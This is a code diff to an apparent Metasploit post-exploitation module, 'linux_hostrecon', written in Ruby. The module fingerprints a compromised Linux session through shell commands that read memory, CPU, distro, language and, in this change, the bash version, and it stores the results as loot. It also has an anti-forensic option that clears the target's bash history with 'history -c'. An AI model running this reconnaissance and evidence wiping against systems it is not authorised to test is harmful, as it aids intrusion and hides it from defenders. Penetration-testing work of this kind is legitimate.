@@ -222,6 +222,7 @@ def run
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
       sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
+      sh_version = cmd_exec("bash --version | head -1 | awk {'print $4'} | cut -d '-' -f1")
       mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
@@ -234,7 +235,7 @@ def run
         #
         data_dump << "\n\n"
         data_dump << "Date/Hour: " + date_out + "\n"
-        data_dump << "----------------------------------------\n"
+        data_dump << "--------------------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Computer     : #{sys_info['Computer']}\n"
         data_dump << "Target session PID  : #{session_pid}\n"
@@ -247,6 +248,7 @@ def run
         data_dump << "Target mem available: #{mem_available}\n"
         data_dump << "Target mem dirty    : #{mem_dirty}\n"
         data_dump << "System language     : #{sys_lang}\n"
+        data_dump << "Bash version        : #{sh_version}\n"
         data_dump << "Python version      : #{py_version}\n"
         data_dump << "Ruby version        : #{ruby_version}\n"
         data_dump << "Target interface    : #{interface}\n"
@@ -444,7 +446,7 @@ def run
        print_status("Deleting remote bash shell history commands list  ..")
        Rex::sleep(0.7)
      end
-        data_dump << "----------------------------"
+        data_dump << "-----------------------------------------------"
 
 
 
@@ -461,21 +463,21 @@ def run
 
 
      #
-     # Store (data_dump) contents into msf loot folder? (local) ..
-     # IF sellected previous in advanced options (set STORE_LOOT true) ..
-     #
-     if datastore['STORE_LOOT'] == true
-       print_warning("Fingerprints stored under: ~/.msf4/loot directory")
-       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
-       Rex::sleep(0.5)
-     end
-     #
      # linux_hostrecon - Anti-forensic module ..
      # This funtion will delete all entrys from remote bash shell (history command list) ..
      #
      if datastore['DEL_SHELL_HISTORY'] == true
-       print_warning("Remote bash shell history command list deleted ..")
+       print_warning("Remote bash shell history commands list deleted ..")
        cmd_exec("history -c")
+       Rex::sleep(0.5)
+     end
+     #
+     # Store (data_dump) contents into msf loot folder? (local) ..
+     # IF sellected previous in advanced options (set STORE_LOOT true) ..
+     #
+     if datastore['STORE_LOOT'] == true
+       print_warning("Target fingerprints stored under: ~/.msf4/loot folder")
+       store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
        Rex::sleep(0.5)
      end
 
